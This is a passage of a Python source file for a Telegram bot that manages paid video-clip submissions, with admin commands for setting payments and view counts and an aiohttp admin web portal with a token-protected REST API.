    res = await db.update_submission_payment(sub_id, amount, views=views)
    if not res:
        await message.answer(f"❌ Submission ID <code>#{sub_id}</code> not found in database.")
        return

    user_chat_id = res["chat_id"]
    sub_link = res["link"]
    caption_line = f"📝 <b>Caption:</b> <i>{html.escape(res['caption'])}</i>\n" if res.get("caption") else ""
    views_line = f"👁 <b>Views:</b> {res.get('views', 0):,}\n" if res.get("views") is not None else ""

    await message.answer(
        f"✅ Payment for Submission <code>#{sub_id}</code> updated to <b>${amount:.2f}</b>!"
        + (f" (Views: {views:,})" if views is not None else "")
    )

    try:
        await message.bot.send_message(
            user_chat_id,
            f"🎉 <b>Submission Payment Updated!</b>\n\n"
            f"Your submission (ID: #{sub_id}) has been reviewed!\n"
            f"🔗 <b>Link:</b> {html.escape(sub_link)}\n"
            f"{caption_line}"
            f"{views_line}"
            f"💰 <b>Payment:</b> <b>${amount:.2f}</b>\n\n"
            f"You can check all your earnings under <b>🔗 Submission Links</b>.",
            disable_web_page_preview=True,
        )
    except Exception as e:
        logging.warning(f"Could not notify user {user_chat_id} about payment update: {e}")

async def set_views_command(message: types.Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = (message.text or "").split()
    if len(parts) != 3:
        await message.answer(
            "⚠️ Incorrect usage.\nFormat: <code>/setviews &lt;submission_id&gt; &lt;views&gt;</code>\nExample: <code>/setviews 1 25000</code>"
        )
        return

    try:
        sub_id = int(parts[1])
        views = int(parts[2])
    except ValueError:
        await message.answer("⚠️ Both submission ID and views must be integers.")
        return

    res = await db.update_submission_views(sub_id, views)
    if not res:
        await message.answer(f"❌ Submission ID <code>#{sub_id}</code> not found in database.")
        return

    user_chat_id = res["chat_id"]
    sub_link = res["link"]

    await message.answer(
        f"✅ Views for Submission <code>#{sub_id}</code> updated to <b>{views:,}</b>!"
    )

    try:
        await message.bot.send_message(
            user_chat_id,
            f"📊 <b>Submission Views Updated!</b>\n\n"
            f"Your submission (ID: #{sub_id}) has been updated with <b>{views:,}</b> views!\n"
            f"🔗 <b>Link:</b> {html.escape(sub_link)}\n\n"
            f"Check your updated stats under <b>📊 Stats</b>.",
            disable_web_page_preview=True,
        )
    except Exception as e:
        logging.warning(f"Could not notify user {user_chat_id} about views update: {e}")

# --- ADMIN PORTAL WEB SERVER & REST API ---
def check_admin_auth(request: web.Request) -> bool:
    auth_header = request.headers.get("Authorization", "")
    expected = get_admin_token()
    if auth_header.startswith("Bearer "):
        token = auth_header[7:].strip()
        if token == expected:
            return True
    token_param = request.query.get("token", "").strip()
    return token_param == expected

async def handle_ping(request: web.Request):
    return web.Response(text="Bot is alive!")

async def handle_index(request: web.Request):
    index_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Frontend", "index.html")
    if os.path.exists(index_file):
        return web.FileResponse(index_file)
    return web.Response(text="Clipper Admin Portal - Frontend not found", status=404)

async def api_admin_login(request: web.Request):
    try:
        data = await request.json()
        password = data.get("password", "")
        if password == ADMIN_PORTAL_PASSWORD:
            return web.json_response({"success": True, "token": get_admin_token()})
        return web.json_response({"error": "Invalid admin password"}, status=401)
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

async def api_admin_me(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    return web.json_response({"authenticated": True})

async def api_admin_stats(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    stats = await db.get_admin_stats()
    return web.json_response(stats, dumps=lambda x: json.dumps(x, default=json_serialize))

async def api_admin_users(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    users = await db.get_admin_users()
    return web.json_response(users, dumps=lambda x: json.dumps(x, default=json_serialize))

async def api_admin_submissions(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    submissions = await db.get_admin_submissions()
    return web.json_response(submissions, dumps=lambda x: json.dumps(x, default=json_serialize))

async def api_admin_update_submission(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    try:
        sub_id = int(request.match_info["id"])
        data = await request.json()
        views = data.get("views")
        payment_amount = data.get("payment_amount")
        status = data.get("status")
        notify_user = data.get("notify_user", True)

        res = await db.admin_update_submission(
            sub_id,
            views=int(views) if views is not None else None,
            payment_amount=float(payment_amount) if payment_amount is not None else None,
            status=status,
        )
        if not res:
            return web.json_response({"error": f"Submission #{sub_id} not found"}, status=404)

        # Notify user on Telegram if requested
        if notify_user and bot_instance and res.get("chat_id"):
            try:
                caption_part = f"📝 <b>Caption:</b> <i>{html.escape(res['caption'])}</i>\n" if res.get("caption") else ""
                views_val = res.get("views", 0)
                pay_val = float(res.get("payment_amount", 0.0))
                status_title = str(res.get("status", "approved")).replace("_", " ").title()

                await bot_instance.send_message(
                    res["chat_id"],
                    f"📢 <b>Submission #{sub_id} Status Updated!</b>\n\n"
                    f"📌 <b>Status:</b> <b>{status_title}</b>\n"
                    f"🔗 <b>Link:</b> {html.escape(res.get('link', ''))}\n"
                    f"{caption_part}"
                    f"👁 <b>Views:</b> {views_val:,}\n"
                    f"💰 <b>Payment:</b> <b>${pay_val:.2f}</b>\n\n"
                    f"Check your updated earnings under <b>📊 Stats</b>.",
                    disable_web_page_preview=True,
                )
            except Exception as e:
                logging.warning(f"Could not notify user {res['chat_id']} on Telegram: {e}")

        return web.json_response({"success": True, "submission": res}, dumps=lambda x: json.dumps(x, default=json_serialize))
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

async def api_admin_update_user_payment(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    try:
        chat_id = int(request.match_info["chat_id"])
        data = await request.json()
        payment_details = data.get("payment_details", "").strip()
        await db.update_payment_info(chat_id, payment_details)
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

async def api_admin_update_user_stats(request: web.Request):
    if not check_admin_auth(request):
        return web.json_response({"error": "Unauthorized"}, status=401)
    try:
        chat_id = int(request.match_info["chat_id"])
        data = await request.json()
        views = int(data.get("views", 0))
        money = float(data.get("money", 0.0))
        user = await db.get_user(chat_id)
        if not user:
            return web.json_response({"error": "User not found"}, status=404)
        target_username = user.get("telegram_username") or f"user_{chat_id}"
        await db.update_user_stats(target_username, views, money)
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=400)

async def start_web_server():
    app = web.Application()
    app.router.add_get("/ping", handle_ping)
    app.router.add_get("/", handle_index)
    app.router.add_get("/admin", handle_index)

    # REST API routes
    app.router.add_post("/api/admin/login", api_admin_login)
    app.router.add_get("/api/admin/me", api_admin_me)
    app.router.add_get("/api/admin/stats", api_admin_stats)
    app.router.add_get("/api/admin/users", api_admin_users)
    app.router.add_get("/api/admin/submissions", api_admin_submissions)
    app.router.add_post("/api/admin/submissions/{id}/update", api_admin_update_submission)
    app.router.add_post("/api/admin/users/{chat_id}/update-payment", api_admin_update_user_payment)
    app.router.add_post("/api/admin/users/{chat_id}/update-stats", api_admin_update_user_stats)

    # Static assets
    frontend_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Frontend")
    if os.path.exists(frontend_dir):
        app.router.add_static("/static", path=frontend_dir, name="static")

    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logging.info(f"🌐 Admin Portal & Web Server running on port {port}")
    return runner

# --- MAIN SETUP ---
async def main():
    global bot_instance
    await db.connect()
    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    bot_instance = bot
    runner = await start_web_server()
    dp = Dispatcher()

    # Middlewares: Block users if they changed their Telegram username
    dp.message.outer_middleware(UsernameLockMiddleware())
    dp.callback_query.outer_middleware(UsernameLockMiddleware())

    # Commands
    dp.message.register(start_command, Command("start"))
    dp.message.register(update_stats_command, Command("update"))
    dp.message.register(set_pay_command, Command("setpay"))
    dp.message.register(set_views_command, Command("setviews"))
    dp.message.register(info_command, Command("info"), Command("user"))

    # FSM Input States
    dp.message.register(process_username, BotStates.waiting_for_username)
    dp.message.register(process_handle, BotStates.entering_handle)
    dp.message.register(process_password, BotStates.entering_password)
    dp.message.register(process_payment_info, BotStates.entering_payment)
    dp.message.register(process_submission_link, BotStates.entering_submission_link)
    dp.message.register(process_submission_caption, BotStates.entering_submission_caption)
    dp.message.register(process_inspect_user, BotStates.inspecting_user)

    # Callbacks
    dp.callback_query.register(
        menu_callback_router,
        F.data.startswith("menu_")
        | (F.data == "back_to_menu")
        | (F.data == "sub_new"),
    )
    dp.callback_query.register(platform_selected, F.data.startswith("plat_"))
    dp.callback_query.register(submission_account_selected, F.data.startswith("subacc_"))

    print("🤖 Bot is up and running...")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()
        await db.close()

if __name__ == "__main__":
    asyncio.run(main())
